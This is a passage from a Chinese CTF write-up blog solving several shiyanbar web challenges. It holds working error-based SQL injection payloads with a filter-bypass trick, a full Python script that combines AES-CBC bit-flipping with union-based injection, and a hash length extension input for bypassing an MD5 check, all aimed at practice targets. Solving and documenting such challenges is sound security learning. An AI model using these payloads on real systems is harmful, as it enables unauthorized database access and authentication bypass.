+<h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p>这题提示确实很明显了，要我们用IE、.net9.9框架和在英国地区访问<br>那就用burpsuit修改http头<br>前两个在User-Agent后加(MSIE 9.0;.NET CLR 9.9)解决<br>后面那个本来以为是用英国IP，没想到改Accept-Language为en-gb;就可以了</p>
+<h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><p>抓包可以看到一个base64编码字符串，没想到tm不用解码就可以用了，我还专门解码懵逼了好久</p>
+<h2 id="貌似有点难、"><a href="#貌似有点难、" class="headerlink" title="貌似有点难、"></a>貌似有点难、</h2><p>并没什么难度，而且什么过滤都没做</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/aee0d3739431210a3d9d58fd405e3c28.png" alt=""></p>
+<p>X-Forwarded-For:1.1.1.1即可<br>但还是了解一下其他两个<br>Client_IP这个变量表示的是代理服务器发送的HTTP头，说是并未成标准，因而很少见<br>Remote_Addr代表的是你的客户端和服务器握手时候的IP。比如但我们使用代理服务器时，里面的值是代理服务器的IP，只有直接连接服务器，服务器才会获得真实IP。</p>
+<h2 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h2><p>这题确实有丶东西<br>一开始试着报错然而各种检测到<br>于是试着写个脚本跑了一下过滤了什么，发现username过滤了()而password过滤了报错注入用的函数名。我们可以构造一个/<em>&amp;password=</em>/把password的去掉，使得前后报错信息都在username上，同时又不会被检测出注入<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=&apos;or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or &apos;</span><br><span class="line">username=&apos;or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;),0x7e),1) or &apos;</span><br><span class="line">username=&apos;or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(value) from ffll44jj),0x7e),1) or &apos;</span><br></pre></td></tr></table></figure>
+<h2 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h2><p>是之前在bugku类似的题，都是找cbc翻转的漏洞<br>先抓个包，发现tips</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/e644e09ddd49a202308380f7036f6694.png" alt=""></p>
+<p>然后打开test.php获得源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define(&quot;SECRET_KEY&quot;, &apos;***********&apos;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line"></span><br><span class="line">error_reporting(0); include(&apos;conn.php&apos;);</span><br><span class="line"></span><br><span class="line">function sqliCheck($str)&#123;</span><br><span class="line">    if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str)) &#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    global $link;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&quot;);</span><br><span class="line">            $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;</span><br><span class="line">            $result=mysqli_query($link,$sql);</span><br><span class="line">            if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link)))&#123;</span><br><span class="line">                $rows=mysqli_fetch_array($result);</span><br><span class="line">                echo &apos;Hello!&apos;.$rows[&apos;username&apos;].&apos;&apos;;</span><br><span class="line">            &#125; else&#123;</span><br><span class="line">                echo &apos;Hello!&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]))&#123;</span><br><span class="line">    $id = (string)$_POST[&apos;id&apos;];</span><br><span class="line">    if(sqliCheck($id)) die(&quot;sql inject detected!&quot;);</span><br><span class="line">    $info = array(&apos;id&apos;=&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    echo &apos;Hello!&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;Login Form </span><br><span class="line">        input id to login&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里就和bugku那道基本一样了，这里把开头的u换了就行<br>写个脚本得flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">from base64 import * </span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php &apos;</span><br><span class="line"></span><br><span class="line">def login(payload):</span><br><span class="line">	payload = &#123;&apos;id&apos;:payload&#125;</span><br><span class="line">	http = requests.post(url,data=payload)</span><br><span class="line">	Set_Cookie = http.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">	iv = re.findall(r&quot;iv=(.*?),&quot;,Set_Cookie)[0]</span><br><span class="line">	cipher = re.findall(r&quot;cipher=(.*)&quot;,Set_Cookie)[0]</span><br><span class="line">	cookie = &#123;&apos;iv&apos;: iv, &apos;cipher&apos;: cipher&#125;</span><br><span class="line">	return cookie</span><br><span class="line"></span><br><span class="line">def cipher_(cipher,idx,s1,s2):</span><br><span class="line">	cipher_raw = b64decode(urllib.unquote(cipher))</span><br><span class="line">	lst = list(cipher_raw)</span><br><span class="line">	lst[idx] = chr(ord(lst[idx])^ord(s1)^ord(s2))</span><br><span class="line">	cipher_new = &apos;&apos;.join(lst)</span><br><span class="line">	cipher_new = urllib.quote(b64encode(cipher_new))</span><br><span class="line">	return cipher_new</span><br><span class="line"></span><br><span class="line">def plain_(iv,cipher_new):</span><br><span class="line">	cookie_new = &#123;&apos;iv&apos;: iv,&apos;cipher&apos;: cipher_new&#125;</span><br><span class="line">	http = requests.post(url,cookies=cookie_new)</span><br><span class="line">	con = http.content</span><br><span class="line">	plain = re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;,con)[0]</span><br><span class="line">	plain = b64decode(plain)</span><br><span class="line">	return plain</span><br><span class="line"></span><br><span class="line">def iv_(iv,plain):</span><br><span class="line">	iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">	plain_first = &apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">	iv_new = &apos;&apos;</span><br><span class="line">	for i in range(16):</span><br><span class="line">		iv_new += chr(ord(plain_first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">	iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">	return iv_new</span><br><span class="line"></span><br><span class="line">def con_(payload,idx,s1,s2):</span><br><span class="line">	cookie = login(payload)</span><br><span class="line">	cipher_new = cipher_(cookie[&apos;cipher&apos;],idx,s1,s2)</span><br><span class="line">	plain = plain_(cookie[&apos;iv&apos;],cipher_new)</span><br><span class="line">	iv_new = iv_(cookie[&apos;iv&apos;],plain)</span><br><span class="line">	cookie_new = &#123;&apos;iv&apos;: iv_new, &apos;cipher&apos;: cipher_new&#125;</span><br><span class="line">	http = requests.post(url,cookies=cookie_new)</span><br><span class="line">	con = http.content</span><br><span class="line">	print con</span><br><span class="line"></span><br><span class="line"># con_(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line"># con_(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database() limit 1 offset 1)b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line"># con_(&apos;0 2nion select * from (select * from you_want as a join you_want as b) as c;&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line"># con_(&quot;0 2nion select * from((select 1)a join (select column_name from information_schema.columns where table_name regexp &apos;flag&apos; limit 1 offset 1)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line"># con_(&apos;0 2nion select * from ((select 1)a join (select value from you_want)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br></pre></td></tr></table></figure>
+<h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p>打开不知道搞什么，就抓包发现cookie里有个source=0，就试着改成1，获得源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/e5d5f51ccdb1041875a589882f412b1c.png" alt=""></p>
+<p>读一下，要我们cookie里getmein的值等于（一串未知15字符+username的值+password的值）进行md5后的值，然后cookie里也会给一串未知15字符+adminadmin进行md5后的值，但这里不允许password输入admin，这就让人很头大的。疯狂挠头了很久后查了一下说是hash长度扩展攻击<br>具体看这：<a href="https://www.cnblogs.com/p00mj/p/6288337.html" target="_blank" rel="noopener">MD5的Hash长度扩展攻击</a></p>
+<p>利用这个漏洞我们就可以用sample-hash获取$secret + adminadmin\x80\x00\x00\x00\x00\x00<br>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin进行md5后的值，然后把password填为<br>admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin就可以使两边相等得到flag</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/04/CGCTF-web-wp/" rel="next" title="CGCTF web wp">
+                <i class="fa fa-chevron-left"></i> CGCTF web wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="shifeng_kaze">
+            
+              <p class="site-author-name" itemprop="name">shifeng_kaze</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#后台登录"><span class="nav-number">1.</span> <span class="nav-text">后台登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#what-a-fuck-这是什么鬼东西"><span class="nav-number">2.</span> <span class="nav-text">what a fuck!这是什么鬼东西?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传绕过"><span class="nav-number">3.</span> <span class="nav-text">上传绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的sql注入"><span class="nav-number">4.</span> <span class="nav-text">简单的sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拐弯抹角"><span class="nav-number">5.</span> <span class="nav-text">拐弯抹角</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forms"><span class="nav-number">6.</span> <span class="nav-text">Forms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Once-More"><span class="nav-number">7.</span> <span class="nav-text">Once More</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#guess-next-session"><span class="nav-number">8.</span> <span class="nav-text">guess next session</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FALSE"><span class="nav-number">9.</span> <span class="nav-text">FALSE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个看起来有点简单"><span class="nav-number">10.</span> <span class="nav-text">这个看起来有点简单!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你真的会PHP吗？"><span class="nav-number">11.</span> <span class="nav-text">你真的会PHP吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆一下好吗"><span class="nav-number">12.</span> <span class="nav-text">登陆一下好吗??</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#因缺思汀的绕过"><span class="nav-number">13.</span> <span class="nav-text">因缺思汀的绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#who-are-you"><span class="nav-number">14.</span> <span class="nav-text">who are you?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的sql注入之3"><span class="nav-number">15.</span> <span class="nav-text">简单的sql注入之3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#天下武功唯快不破"><span class="nav-number">16.</span> <span class="nav-text">天下武功唯快不破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#忘记密码了"><span class="nav-number">17.</span> <span class="nav-text">忘记密码了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NSCTF-web200"><span class="nav-number">18.</span> <span class="nav-text">NSCTF web200</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序逻辑问题"><span class="nav-number">19.</span> <span class="nav-text">程序逻辑问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP大法"><span class="nav-number">20.</span> <span class="nav-text">PHP大法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的sql注入之2"><span class="nav-number">21.</span> <span class="nav-text">简单的sql注入之2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#头有点大"><span class="nav-number">22.</span> <span class="nav-text">头有点大</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#猫抓老鼠"><span class="nav-number">23.</span> <span class="nav-text">猫抓老鼠</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#貌似有点难、"><span class="nav-number">24.</span> <span class="nav-text">貌似有点难、</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加了料的报错注入"><span class="nav-number">25.</span> <span class="nav-text">加了料的报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的登录题"><span class="nav-number">26.</span> <span class="nav-text">简单的登录题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#让我进去"><span class="nav-number">27.</span> <span class="nav-text">让我进去</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shifeng_kaze</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
